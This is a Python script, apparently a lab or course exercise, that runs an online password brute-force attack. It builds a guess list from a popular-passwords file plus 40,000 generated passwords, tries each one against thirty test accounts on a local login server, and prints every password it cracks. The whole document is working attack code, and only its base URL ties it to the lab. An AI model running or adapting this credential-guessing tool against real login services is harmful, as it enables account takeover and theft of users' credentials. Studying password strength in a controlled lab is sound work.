from client import LoginClient
import secrets
import string
import aiohttp
import asyncio

group_seed = 413134
#base_url = 'http://192.168.1.103:5000'
base_url = 'http://127.0.0.1:5000'


def generate_medium_password():
    
    # generate word    
    word = ''.join(secrets.choice(string.ascii_lowercase) for _ in range((secrets.randbelow(17) - 3)))

    # randomly capitalize or not
    if secrets.choice([True, False]):
        word = word.capitalize()

    digits = ''.join(secrets.choice(string.digits) for _ in range(2))
    symbol = secrets.choice("!@#$%^&*")

    return word + digits + symbol


def generate_strong_password(min_len=2, max_len=16):
    length = secrets.randbelow(max_len - min_len + 1) + min_len
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(length))


weak_passwords = []
with open('crack/popular_passwords.txt', 'r') as f:
    for line in f:
        weak_passwords.append(line.strip())


def build_password_map(med_amount = 20000, strong_amount=20000):
    passwords = []
    with open('crack/popular_passwords.txt', 'r') as f:
        for line in f:
            passwords.append(line.strip())
    for i in range(med_amount):
        passwords.append(generate_medium_password())
    for i in range(strong_amount):
        passwords.append(generate_strong_password())

    return passwords


async def iterate_over_user(username, passwords):
    counter = 0
    async with aiohttp.ClientSession() as session:
        client = LoginClient(session, base_url, group_seed)

        for password in passwords:
            if await client.attempt_login_once(username, password):
                print(f"{username}, {password}, Broke after {counter} iterations")
                return True
            else:
                #print(f"{username}, {password}, Fail!")
                counter = counter + 1
        return False

async def main():
    passwords = build_password_map()

    for i in range(1, 30+1, 1):
        level = int(i / 10)
        if level == 0:
            state = 'weak'
        elif level == 1:
            state = 'medium'
        elif level == 2:
            state = 'strong'

        idx = i % 10 if i % 10 != 0 else 10
        username = f'user_{state}_{idx}'


        print(f"iterating over {username}...")
        await iterate_over_user(username, passwords)

if __name__ == "__main__":
    asyncio.run(main())